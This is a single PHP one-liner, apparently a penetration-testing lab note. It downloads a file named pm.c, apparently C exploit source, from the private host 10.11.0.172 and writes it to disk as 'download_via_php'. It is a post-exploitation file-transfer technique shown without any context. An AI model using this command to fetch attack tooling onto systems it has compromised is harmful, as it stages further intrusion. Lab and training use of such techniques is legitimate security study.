php -r '{ $in=fopen("http://10.11.0.172/pm.c", "rb"); $out=fopen("download_via_php", "wb"); while ($chunk = fread($in,8192)) { fwrite($out, $chunk, 8192); } fclose($in); fclose($out); } '
